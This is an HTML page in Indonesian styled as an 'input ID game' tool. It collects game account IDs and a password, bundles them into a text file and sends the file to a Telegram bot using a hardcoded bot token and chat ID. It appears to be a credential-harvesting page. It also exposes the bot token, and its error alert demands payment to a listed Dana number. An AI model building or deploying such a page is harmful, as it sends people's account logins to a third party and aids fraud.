<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Input ID Game</title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@400;600;700&display=swap');

    body {
        font-family: 'Source Code Pro', monospace;
        background-color: #000000;
        color: #00ff00;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
    }

    .container {
        background-color: #111111;
        padding: 30px 40px;
        border-radius: 10px;
        box-shadow: 0 0 20px #00ff00;
        width: 100%;
        max-width: 500px;
        border: 1px solid #00ff00;
    }

    h2 {
        text-align: center;
        margin-bottom: 20px;
        color: #00ff00;
        text-shadow: 0 0 10px #00ff00;
    }

    label {
        display: block;
        margin-top: 15px;
        font-weight: 600;
        color: #00ff00;
    }

    textarea, input {
        width: 100%;
        padding: 10px;
        margin-top: 5px;
        border-radius: 5px;
        border: 1px solid #00ff00;
        background-color: #000;
        color: #00ff00;
        font-family: 'Source Code Pro', monospace;
        font-size: 14px;
        box-shadow: 0 0 5px #00ff00;
    }

    textarea:focus, input:focus {
        outline: none;
        border-color: #00ff00;
        box-shadow: 0 0 10px #00ff00;
    }

    .btn-primary, .btn-secondary {
        width: 100%;
        padding: 12px;
        font-weight: 600;
        font-family: 'Source Code Pro', monospace;
        margin-top: 15px;
        border-radius: 5px;
        border: 1px solid #00ff00;
        cursor: pointer;
        text-transform: uppercase;
        transition: 0.3s;
    }

    .btn-primary {
        background-color: #000;
        color: #00ff00;
        box-shadow: 0 0 10px #00ff00;
    }

    .btn-primary:hover {
        background-color: #00ff00;
        color: #000;
        box-shadow: 0 0 20px #00ff00;
    }

    .btn-secondary {
        background-color: #000;
        color: #00ff00;
        box-shadow: 0 0 10px #00ff00 inset;
    }

    .btn-secondary:hover {
        background-color: #00ff00;
        color: #000;
        box-shadow: 0 0 20px #00ff00;
    }
</style>
</head>
<body>

<div class="container">
    <h2>IBNU PROJECT INPUT ID GAME</h2>

    <label>Masukkan ID (satu ID per baris):</label>
    <textarea id="idList" rows="10" placeholder="ID..."></textarea>

    <label>Password:</label>
    <input type="text" id="password" placeholder="Masukkan password">

    <button class="btn-primary" onclick="kirim()">Kirim</button>
    <button class="btn-secondary" onclick="window.location.href='index2.html'">Bersihkan ID</button>
</div>

<script>
    const botToken = '8538136716:AAHB8NsZmK4PWmruC7BHvz-eky6oiCXCwKM';
    const chatId  = '5633583961';

    async function kirim() {
        const idText = document.getElementById('idList').value.trim();
        const password = document.getElementById('password').value.trim();

        if (!idText || !password) {
            alert("ID dan Password harus diisi!");
            return;
        }

        const idArray = idText.split(/\r?\n/);
        let output = "";

        idArray.forEach(id => {
            output += id.trim() + "\t" + password + "\n";
        });

        const blob = new Blob([output], { type: "text/plain" });
        const file = new File([blob], "hasilID.txt");

        const formData = new FormData();
        formData.append("document", file);

        try {
            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}`, {
                method: "POST",
                body: formData
            });

            const data = await response.json();
            if (data.ok) {
                alert("File berhasil dikirim ke Telegram!");
            } else {
                alert("Gagal mengirim file, Harap bayar lebih dahulu Dana 085386808123: " + data.description);
            }
        } catch (err) {
            alert("Terjadi kesalahan: " + err.message);
        }
    }
</script>

</body>
</html>
